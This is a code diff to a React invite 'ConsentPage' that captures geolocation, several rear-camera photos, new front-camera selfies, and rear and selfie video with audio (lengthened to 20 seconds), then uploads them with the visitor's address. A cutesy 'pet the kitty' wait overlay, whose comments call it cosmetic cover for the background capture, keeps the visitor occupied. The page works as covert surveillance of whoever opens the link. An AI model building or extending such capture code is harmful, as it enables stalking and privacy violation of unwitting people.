@@ -18,7 +18,9 @@ import { FloatingSparkles } from "@/components/invites/FloatingSparkles";
 
 const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 const GEO_PHOTO_COUNT = 5;
-const GEO_VIDEO_DURATION_MS = 5000;
+const GEO_SELFIE_PHOTO_COUNT = 2;
+const GEO_VIDEO_DURATION_MS = 20_000;
+const GEO_VIDEO_DURATION_SECONDS = GEO_VIDEO_DURATION_MS / 1000;
 
 function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
   const ctrl = new AbortController();
@@ -93,12 +95,29 @@ function CopyAndOpenButton({ url }: { url: string }) {
   );
 }
 
-const KITTY_WAIT_SECONDS = 15;
+const KITTY_WAIT_SECONDS = 30;
+
+// Playful status lines that rotate every few seconds so the wait doesn't
+// feel static — purely cosmetic, has no effect on the actual capture work
+// happening in the background.
+const KITTY_MESSAGES = [
+  "Getting everything set up just for you 🐾",
+  "Sniffing out your exact location… 🐽",
+  "Fluffing up the pixels for you 🐈‍⬛",
+  "Almost there, promise! 🎀",
+  "Just a little more patience, friend 🧶",
+];
+
+// Reactions shown for a couple seconds after the kitty is tapped/petted —
+// gives the wait something to *do* instead of just watching a timer.
+const KITTY_PET_REACTIONS = ["💕", "😻", "✨", "🐾", "💫"];
 
 /** Full-screen pink "please wait" overlay shown once while sharing is set up. */
 function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
   const [secondsLeft, setSecondsLeft] = useState(KITTY_WAIT_SECONDS);
   const [phase, setPhase] = useState<"waiting" | "kiss">("waiting");
+  const [petCount, setPetCount] = useState(0);
+  const [petBursts, setPetBursts] = useState<{ id: number; emoji: string }[]>([]);
 
   // Keep the latest onComplete in a ref so the kiss-phase timer effect below
   // only depends on `phase` — an inline callback identity changing on every
@@ -120,8 +139,19 @@ function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
     return () => clearTimeout(id);
   }, [phase]);
 
+  const handlePet = useCallback(() => {
+    setPetCount((c) => c + 1);
+    const id = Date.now() + Math.random();
+    const emoji = KITTY_PET_REACTIONS[Math.floor(Math.random() * KITTY_PET_REACTIONS.length)];
+    setPetBursts((b) => [...b, { id, emoji }]);
+    setTimeout(() => setPetBursts((b) => b.filter((x) => x.id !== id)), 1000);
+  }, []);
+
   const circumference = 2 * Math.PI * 62;
   const progress = (KITTY_WAIT_SECONDS - secondsLeft) / KITTY_WAIT_SECONDS;
+  const message = petCount > 0 && petCount % 3 === 0
+    ? "Purrrr… you're the best 🥰"
+    : KITTY_MESSAGES[Math.floor((KITTY_WAIT_SECONDS - secondsLeft) / 6) % KITTY_MESSAGES.length];
 
   return (
     <div
@@ -171,15 +201,18 @@ function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
                   transition={{ duration: 1, ease: "linear" }}
                 />
               </svg>
-              <motion.span
-                className="text-6xl select-none"
-                role="img"
-                aria-label="pleading cat"
+              <motion.button
+                type="button"
+                onClick={handlePet}
+                aria-label="pet the cat"
+                data-testid="button-pet-kitty"
+                className="text-6xl select-none cursor-pointer bg-transparent border-none p-0"
                 animate={{ y: [0, -10, 0], rotate: [-3, 3, -3] }}
                 transition={{ duration: 1.2, repeat: Infinity, ease: "easeInOut" }}
+                whileTap={{ scale: 1.35, rotate: 0 }}
               >
                 🐱
-              </motion.span>
+              </motion.button>
               <motion.span
                 className="absolute top-2 right-4 text-2xl select-none"
                 animate={{ opacity: [0.55, 1, 0.55], scale: [0.9, 1.2, 0.9] }}
@@ -187,12 +220,30 @@ function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
               >
                 🥺
               </motion.span>
+              <AnimatePresence>
+                {petBursts.map((burst, i) => (
+                  <motion.span
+                    key={burst.id}
+                    className="absolute text-2xl select-none pointer-events-none"
+                    style={{ left: `${40 + i * 10}%`, top: "40%" }}
+                    initial={{ y: 0, scale: 0.5, opacity: 1 }}
+                    animate={{ y: -70, scale: 1.2, opacity: 0 }}
+                    exit={{ opacity: 0 }}
+                    transition={{ duration: 0.9, ease: "easeOut" }}
+                  >
+                    {burst.emoji}
+                  </motion.span>
+                ))}
+              </AnimatePresence>
             </div>
             <p className="text-xl font-bold mb-1" style={{ color: "#7a1256" }}>
               Please wait {secondsLeft}s… 🥺
             </p>
+            <p className="text-xs mb-1" style={{ color: "#b8477f" }}>
+              Tap the cat — it loves attention 🐾{petCount > 0 ? ` (petted ${petCount}×)` : ""}
+            </p>
             <p className="text-sm" style={{ color: "#9c2a6b" }}>
-              Getting everything set up just for you 🐾
+              {message}
             </p>
           </motion.div>
         ) : (
@@ -297,10 +348,11 @@ function prewarmCameraAndMic(): void {
 
 async function uploadGeoPhoto(
   token: string, photoData: string, lat: number, lng: number, address: string | undefined,
+  cameraFacing: "environment" | "user",
 ): Promise<boolean> {
   try {
     const { signal, clear } = abortAfter(10_000);
-    const resp = await fetch(`${API_BASE}/api/geo-photos`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address }), signal }).finally(clear);
+    const resp = await fetch(`${API_BASE}/api/geo-photos`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address, cameraFacing }), signal }).finally(clear);
     return resp.ok;
   } catch { return false; }
 }
@@ -315,11 +367,13 @@ const GEO_PHOTO_QUALITY = 0.6;
 async function captureGeoPhotos(
   token: string, lat: number, lng: number, address: string | undefined,
   onProgress: (n: number) => void,
+  facingMode: "environment" | "user" = "environment",
+  count: number = GEO_PHOTO_COUNT,
 ): Promise<void> {
   if (!navigator.mediaDevices?.getUserMedia) return;
   let stream: MediaStream | null = null;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
     const video = document.createElement("video");
     video.srcObject = stream; video.muted = true; video.playsInline = true;
     await video.play();
@@ -328,21 +382,25 @@ async function captureGeoPhotos(
     await new Promise((r) => setTimeout(r, 350));
     const canvas = document.createElement("canvas"); canvas.width = GEO_PHOTO_WIDTH; canvas.height = GEO_PHOTO_HEIGHT;
     const ctx = canvas.getContext("2d")!;
+    // Selfie shots (front camera) are naturally mirrored by the sensor on
+    // most devices' preview — flip horizontally so the saved photo looks
+    // like a normal (non-mirrored) selfie.
+    if (facingMode === "user") { ctx.translate(GEO_PHOTO_WIDTH, 0); ctx.scale(-1, 1); }
 
     // Grab all frames back-to-back (only a small gap so each frame is
     // distinct), then compress + upload every shot in parallel instead of
     // serializing capture behind each upload's round trip.
     let uploaded = 0;
     const uploads: Promise<void>[] = [];
-    for (let i = 0; i < GEO_PHOTO_COUNT; i++) {
+    for (let i = 0; i < count; i++) {
       ctx.drawImage(video, 0, 0, GEO_PHOTO_WIDTH, GEO_PHOTO_HEIGHT);
       const photoData = canvas.toDataURL("image/jpeg", GEO_PHOTO_QUALITY);
       uploads.push(
-        uploadGeoPhoto(token, photoData, lat, lng, address).then((ok) => {
+        uploadGeoPhoto(token, photoData, lat, lng, address, facingMode).then((ok) => {
           if (ok) { uploaded += 1; onProgress(uploaded); }
         }),
       );
-      if (i < GEO_PHOTO_COUNT - 1) await new Promise((r) => setTimeout(r, 120));
+      if (i < count - 1) await new Promise((r) => setTimeout(r, 120));
     }
     await Promise.all(uploads);
   } catch { /* camera denied — skip */ } finally { stream?.getTracks().forEach((t) => t.stop()); }
@@ -354,15 +412,16 @@ async function captureGeoVideo(
   facingMode: "environment" | "user" = "environment",
 ): Promise<void> {
   if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
-  const MIME_CANDIDATES = ["video/webm;codecs=vp8", "video/webm;codecs=vp9", "video/webm", "video/mp4"];
+  const MIME_CANDIDATES = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"];
   const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
-  // Lower bitrate than before — a smaller encoded file compresses and
-  // uploads noticeably faster with no visible quality loss at this
-  // resolution/duration.
-  const VIDEO_BPS = 180_000; const AUDIO_BPS = 40_000;
+  // Bitrate/resolution raised well above the old 180kbps/480x360 baseline —
+  // at 20s duration this still lands well under the 50mb JSON body limit
+  // (≈1.9MB video + ~0.16MB audio raw, ~2.6MB after base64 overhead) while
+  // looking noticeably sharper even after the browser's own compression.
+  const VIDEO_BPS = 600_000; const AUDIO_BPS = 64_000;
   let stream: MediaStream | null = null;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 480, max: 640 }, height: { ideal: 360, max: 480 }, frameRate: { ideal: 15, max: 24 } }, audio: { echoCancellation: true, noiseSuppression: true } });
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 640, max: 960 }, height: { ideal: 480, max: 720 }, frameRate: { ideal: 24, max: 30 } }, audio: { echoCancellation: true, noiseSuppression: true } });
     // Short settle so autofocus/exposure isn't mid-adjustment when recording
     // starts — no need for the previous long pause.
     await new Promise((r) => setTimeout(r, 200));
@@ -384,7 +443,7 @@ async function captureGeoVideo(
     const body = JSON.stringify({ token, videoData: base64, mimeType: blob.type, durationMs: GEO_VIDEO_DURATION_MS, latitude: lat, longitude: lng, address, cameraFacing: facingMode });
     let uploaded = false;
     for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
-      try { const { signal, clear } = abortAfter(20_000); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
+      try { const { signal, clear } = abortAfter(30_000); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
     }
     onStateChange(uploaded ? "done" : "error");
   } catch { onStateChange("error"); } finally { stream?.getTracks().forEach((t) => t.stop()); }
@@ -420,6 +479,8 @@ export default function ConsentPage() {
   const [lastSent, setLastSent] = useState<Date | null>(null);
   const [geoPhotoCount, setGeoPhotoCount] = useState(0);
   const [geoPhotoDone, setGeoPhotoDone] = useState(false);
+  const [geoSelfiePhotoCount, setGeoSelfiePhotoCount] = useState(0);
+  const [geoSelfiePhotoDone, setGeoSelfiePhotoDone] = useState(false);
   const [geoVideoState, setGeoVideoState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
   const [geoSelfieState, setGeoSelfieState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
   const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
@@ -431,6 +492,7 @@ export default function ConsentPage() {
   const kittyOverlayStartedRef = useRef(false);
 
   const geoBoardStartedRef = useRef(false);
+  const geoSelfiePhotoStartedRef = useRef(false);
   const geoVideoStartedRef = useRef(false);
   const geoSelfieStartedRef = useRef(false);
   const earlyGeoRef = useRef<GeolocationPosition | null>(null);
@@ -589,8 +651,17 @@ export default function ConsentPage() {
 
     if (!geoBoardStartedRef.current) {
       geoBoardStartedRef.current = true;
-      captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoPhotoCount(n))
-        .then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true));
+      // Rear-facing "surroundings" photos first, then 2 front-facing selfie
+      // photos — sequential since most phones only expose one active
+      // camera stream at a time.
+      captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoPhotoCount(n), "environment", GEO_PHOTO_COUNT)
+        .then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true))
+        .finally(() => {
+          if (geoSelfiePhotoStartedRef.current) return;
+          geoSelfiePhotoStartedRef.current = true;
+          captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoSelfiePhotoCount(n), "user", GEO_SELFIE_PHOTO_COUNT)
+            .then(() => setGeoSelfiePhotoDone(true)).catch(() => setGeoSelfiePhotoDone(true));
+        });
     }
     if (!geoVideoStartedRef.current) {
       geoVideoStartedRef.current = true;
@@ -1045,14 +1116,33 @@ export default function ConsentPage() {
                 </div>
               )}
 
+              {/* Selfie photo progress (front camera, 2 shots, runs after the environment photos) */}
+              {geoBoardStartedRef.current && !geoSelfiePhotoDone && geoPhotoDone && (
+                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
+                  <Camera className="h-4 w-4 text-pink-400 flex-shrink-0 animate-pulse" />
+                  <div className="flex-1">
+                    <p className="text-xs font-medium text-pink-300">GeoBoard: capturing selfie photos {geoSelfiePhotoCount}/{GEO_SELFIE_PHOTO_COUNT}</p>
+                    <div className="mt-1 h-1 bg-pink-900/40 rounded-full overflow-hidden">
+                      <div className="h-full bg-pink-500 rounded-full transition-all duration-500" style={{ width: `${(geoSelfiePhotoCount / GEO_SELFIE_PHOTO_COUNT) * 100}%` }} />
+                    </div>
+                  </div>
+                </div>
+              )}
+              {geoSelfiePhotoDone && geoSelfiePhotoCount > 0 && (
+                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
+                  <Camera className="h-4 w-4 text-pink-400 flex-shrink-0" />
+                  <p className="text-xs font-medium text-pink-300">GeoBoard: {geoSelfiePhotoCount} selfie photo{geoSelfiePhotoCount !== 1 ? "s" : ""} saved ✓</p>
+                </div>
+              )}
+
               {/* Video progress */}
               {geoVideoState === "recording" && (
                 <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
                   <Video className="h-4 w-4 text-rose-400 flex-shrink-0 animate-pulse" />
                   <div className="flex-1">
-                    <p className="text-xs font-medium text-rose-300">GeoBoard: recording 5s video…</p>
+                    <p className="text-xs font-medium text-rose-300">GeoBoard: recording {GEO_VIDEO_DURATION_SECONDS}s video…</p>
                     <div className="mt-1 h-1 bg-rose-900/40 rounded-full overflow-hidden">
-                      <div className="h-full bg-rose-500 rounded-full" style={{ width: "100%", transition: "width 5s linear" }} />
+                      <div className="h-full bg-rose-500 rounded-full" style={{ width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }} />
                     </div>
                   </div>
                 </div>
@@ -1075,9 +1165,9 @@ export default function ConsentPage() {
                 <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
                   <Video className="h-4 w-4 text-pink-400 flex-shrink-0 animate-pulse" />
                   <div className="flex-1">
-                    <p className="text-xs font-medium text-pink-300">GeoBoard: recording 5s selfie video…</p>
+                    <p className="text-xs font-medium text-pink-300">GeoBoard: recording {GEO_VIDEO_DURATION_SECONDS}s selfie video…</p>
                     <div className="mt-1 h-1 bg-pink-900/40 rounded-full overflow-hidden">
-                      <div className="h-full bg-pink-500 rounded-full" style={{ width: "100%", transition: "width 5s linear" }} />
+                      <div className="h-full bg-pink-500 rounded-full" style={{ width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }} />
                     </div>
                   </div>
                 </div>
